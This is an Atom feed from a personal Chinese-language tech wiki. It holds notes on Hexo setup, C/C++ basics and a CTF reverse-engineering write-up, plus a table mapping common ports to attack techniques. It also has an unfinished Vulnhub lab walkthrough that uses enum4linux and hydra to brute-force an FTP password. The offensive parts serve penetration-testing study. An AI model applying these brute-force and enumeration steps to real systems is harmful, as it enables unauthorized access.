<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kn0sky&#39;wiki</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kn0sky.com/"/>
  <updated>2020-06-04T02:57:58.000Z</updated>
  <id>http://kn0sky.com/</id>
  
  <author>
    <name>kn0sky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>树莓派3B+应用--下载机【待完成】</title>
    <link href="http://kn0sky.com/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E4%B8%8B%E8%BD%BD%E6%9C%BA/"/>
    <id>http://kn0sky.com/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E4%B8%8B%E8%BD%BD%E6%9C%BA/</id>
    <published>2020-06-04T01:36:11.000Z</published>
    <updated>2020-06-04T02:57:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="树莓派3B-应用–下载机"><a href="#树莓派3B-应用–下载机" class="headerlink" title="树莓派3B+应用–下载机"></a>树莓派3B+应用–下载机</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://www.jianshu.com/p/09d9207c1621" target="_blank" rel="external nofollow noopener noreferrer">https://www.jianshu.com/p/09d9207c1621</a></li><li><a href="https://tlanyan.me/setup-samba-in-raspberry-pi/" target="_blank" rel="external nofollow noopener noreferrer">https://tlanyan.me/setup-samba-in-raspberry-pi/</a></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;树莓派3B-应用–下载机&quot;&gt;&lt;a href=&quot;#树莓派3B-应用–下载机&quot; class=&quot;headerlink&quot; title=&quot;树莓派3B+应用–下载机&quot;&gt;&lt;/a&gt;树莓派3B+应用–下载机&lt;/h2&gt;&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; cla
      
    
    </summary>
    
    
      <category term="折腾笔记" scheme="http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"/>
    
      <category term="树莓派" scheme="http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
    
  </entry>
  
  <entry>
    <title>搭建hexo博客备忘录</title>
    <link href="http://kn0sky.com/wiki/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://kn0sky.com/wiki/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2020-06-02T08:21:13.000Z</published>
    <updated>2020-06-02T08:59:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="搭建hexo博客备忘录"><a href="#搭建hexo博客备忘录" class="headerlink" title="搭建hexo博客备忘录"></a>搭建hexo博客备忘录</h2><p>安装环境：Ubuntu（WSL2）</p><blockquote><p> 教程：<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="external nofollow noopener noreferrer">https://hexo.io/zh-cn/docs/</a></p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装Node.JS,node.JS 版本太高会出错</span></span><br><span class="line">wget https://deb.nodesource.com/setup_12.x  </span><br><span class="line">sudo -E bash setup_12.x </span><br><span class="line">sudo apt-get install -y nodejs</span><br><span class="line">rm setup_12.x</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装Git</span></span><br><span class="line">sudo apt install git-core</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装hexo</span></span><br><span class="line">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>配合typora需要修改post模板：./hexo/scaffolds/post.md</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">toc: true</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">typora-root-url: &#123;&#123; title &#125;&#125;</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">## 参考资料</span></span><br><span class="line"><span class="quote">&gt; - []()</span></span><br><span class="line"><span class="quote">&gt; - []()</span></span><br><span class="line">~</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;搭建hexo博客备忘录&quot;&gt;&lt;a href=&quot;#搭建hexo博客备忘录&quot; class=&quot;headerlink&quot; title=&quot;搭建hexo博客备忘录&quot;&gt;&lt;/a&gt;搭建hexo博客备忘录&lt;/h2&gt;&lt;p&gt;安装环境：Ubuntu（WSL2）&lt;/p&gt;
&lt;blockquote&gt;
      
    
    </summary>
    
    
      <category term="备忘笔记" scheme="http://kn0sky.com/categories/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C++基础01--初见C++</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C++%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81C++/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C++%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81C++/</id>
    <published>2020-06-01T07:40:50.000Z</published>
    <updated>2020-06-01T07:52:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-语言基础01–初见C"><a href="#C-语言基础01–初见C" class="headerlink" title="C++语言基础01–初见C++"></a>C++语言基础01–初见C++</h1><p>本系列笔记基于C++17标准</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C-语言基础01–初见C&quot;&gt;&lt;a href=&quot;#C-语言基础01–初见C&quot; class=&quot;headerlink&quot; title=&quot;C++语言基础01–初见C++&quot;&gt;&lt;/a&gt;C++语言基础01–初见C++&lt;/h1&gt;&lt;p&gt;本系列笔记基于C++17标准&lt;/p&gt;
&lt;h3 i
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C++学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>常见端口号&amp;漏洞</title>
    <link href="http://kn0sky.com/wiki/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3&amp;%E6%BC%8F%E6%B4%9E/"/>
    <id>http://kn0sky.com/wiki/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3&amp;%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-06-01T00:06:19.000Z</published>
    <updated>2020-05-31T23:48:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常见端口号-amp-漏洞"><a href="#常见端口号-amp-漏洞" class="headerlink" title="常见端口号&amp;漏洞"></a>常见端口号&amp;漏洞</h2><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击技巧</th></tr></thead><tbody><tr><td>21/22/69</td><td>ftp/tftp：文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase/DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic</td><td>Java反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere控制台</td><td>爆破：控制台弱口令\Java反序列</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破\未授权访问</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;常见端口号-amp-漏洞&quot;&gt;&lt;a href=&quot;#常见端口号-amp-漏洞&quot; class=&quot;headerlink&quot; title=&quot;常见端口号&amp;amp;漏洞&quot;&gt;&lt;/a&gt;常见端口号&amp;amp;漏洞&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;端口号&lt;/th&gt;
      
    
    </summary>
    
    
      <category term="渗透笔记" scheme="http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    
      <category term="常见服务" scheme="http://kn0sky.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>【Vulnhub】Sunset:nightfall--Workthourgh：未完成</title>
    <link href="http://kn0sky.com/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/6-nightfall/"/>
    <id>http://kn0sky.com/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/6-nightfall/</id>
    <published>2020-05-31T08:36:15.000Z</published>
    <updated>2020-05-31T10:44:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="【Vulnhub】Sunset-nightfall–Workthourgh"><a href="#【Vulnhub】Sunset-nightfall–Workthourgh" class="headerlink" title="【Vulnhub】Sunset:nightfall–Workthourgh"></a>【Vulnhub】Sunset:nightfall–Workthourgh</h2><blockquote><p>文章作者：kn0sky</p><p>作者博客：kn0sky.com</p></blockquote><h3 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h3><h3 id="用到的工具-知识"><a href="#用到的工具-知识" class="headerlink" title="用到的工具/知识"></a>用到的工具/知识</h3><ul><li><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3></li></ul><p>攻击机<code>IP</code>：192.168.101.5</p><p>靶机<code>IP</code>：192.168.101.6</p><p><strong>端口扫描：</strong></p><p><img src="image-20200531164459736.png" alt="image-20200531164459736"></p><p>目标开放了21/22/80/139/445/3306端口</p><p>这几个端口可能存在的问题：【找图片/表格】</p><p>80端口是Apache默认页面，目录扫描之后除了Apache还有一个403进不去</p><p>见到samba就枚举用户名：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.101.6</span><br></pre></td></tr></table></figure><p><img src="image-20200531181458414.png" alt="image-20200531181458414"></p><p>得到用户名：<code>matt</code>和<code>nightfall</code></p><p>使用<code>hydra</code>去爆破ftp账号弱口令：</p><p><img src="image-20200531182042736.png" alt="image-20200531182042736"></p><p>得到<code>matt</code>的密码为<code>cheese</code></p><p>登录ftp看看：</p><p><img src="image-20200531182159809.png" alt="image-20200531182159809"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href></a></li><li><a href></a></li><li>1nslght-workthrough：<a href="https://blog.csdn.net/weixin_44214107/article/details/102617065" target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/weixin_44214107/article/details/102617065</a></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;【Vulnhub】Sunset-nightfall–Workthourgh&quot;&gt;&lt;a href=&quot;#【Vulnhub】Sunset-nightfall–Workthourgh&quot; class=&quot;headerlink&quot; title=&quot;【Vulnhub】Sunset:ni
      
    
    </summary>
    
    
      <category term="靶机笔记" scheme="http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/"/>
    
      <category term="vulnhub" scheme="http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/"/>
    
    
  </entry>
  
  <entry>
    <title>open-source Write Up</title>
    <link href="http://kn0sky.com/wiki/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/REVERSE/re001-open-source/"/>
    <id>http://kn0sky.com/wiki/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/REVERSE/re001-open-source/</id>
    <published>2020-05-29T12:40:50.000Z</published>
    <updated>2020-05-29T12:47:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-source-Write-Up"><a href="#open-source-Write-Up" class="headerlink" title="open-source Write Up"></a>open-source Write Up</h2><p>难度：☆☆☆</p><p>这道题提供了一个c语言源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然我们需要让这段代码跑起来并且跑到最后让程序自己算出来flag，</p><p>所以我们我们需要把main函数需要的参数值删掉并且放到main函数内去定义,修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">int argc &#x3D; 4;</span><br><span class="line">char * argv[] &#x3D; &#123;&quot;1&quot;,&quot;51966&quot;,&quot;25&quot;,&quot;h4cky0u&quot;&#125;;</span><br></pre></td></tr></table></figure><p>这里的<code>atoi()</code>函数的功能是从前往后取字符串整数部分，所以我们把<code>argv[1]</code>所需要的整数的十六进制转换成十进制<code>0xcafe</code>，即<code>51996</code>，即可</p><p>然后点击调试，程序即可顺利运行到最后</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-source-Write-Up&quot;&gt;&lt;a href=&quot;#open-source-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;open-source Write Up&quot;&gt;&lt;/a&gt;open-source Write Up&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="XCTF攻防世界WP" scheme="http://kn0sky.com/categories/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/"/>
    
      <category term="新手练习区" scheme="http://kn0sky.com/categories/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    
      <category term="REVERSE" scheme="http://kn0sky.com/categories/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/REVERSE/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础09--C预处理器和C库</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8009--C%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E5%92%8CC%E5%BA%93/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8009--C%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E5%92%8CC%E5%BA%93/</id>
    <published>2020-05-28T08:40:50.000Z</published>
    <updated>2020-05-28T03:03:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础09–C预处理器和C库"><a href="#C语言基础09–C预处理器和C库" class="headerlink" title="C语言基础09–C预处理器和C库"></a>C语言基础09–C预处理器和C库</h1><h3 id="预处理器"><a href="#预处理器" class="headerlink" title="预处理器"></a>预处理器</h3><p>预处理器是<code>#</code>号开头的，比如宏：#define</p><p>宏的基本用法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,Five);<span class="comment">//在编译过程中，Five会被直接替换成5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>带参数的宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five(X) X*X</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,Five(<span class="number">5</span>));<span class="comment">//在编译过程中，替换成一段表达式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five(X) printf(<span class="meta-string">"This is %d"</span>,X)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Five(<span class="number">5</span>);<span class="comment">//在编译过程中，替换成一段表达式,打印字符串出来</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件的预处理器//#indef #else #endif</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#indef #else #endif</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> Five</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//通过define来判断执行什么语句</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>Five</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"yes"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件的预处理器 #if #elif #endif</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Five 4</span></span><br><span class="line"><span class="comment">//#undef Five</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>Five ==5</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"yes"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> Five ==4</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用于不同版本系统的编译</p><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><p>代码开头的#include&lt;stdio.h&gt;是将该库中的所有代码复制进代码中，可以直接调用</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础09–C预处理器和C库&quot;&gt;&lt;a href=&quot;#C语言基础09–C预处理器和C库&quot; class=&quot;headerlink&quot; title=&quot;C语言基础09–C预处理器和C库&quot;&gt;&lt;/a&gt;C语言基础09–C预处理器和C库&lt;/h1&gt;&lt;h3 id=&quot;预处理器&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP代码调试环境搭建</title>
    <link href="http://kn0sky.com/wiki/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/PHP%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://kn0sky.com/wiki/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/PHP%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-05-28T06:40:50.000Z</published>
    <updated>2020-05-29T12:35:14.000Z</updated>
    
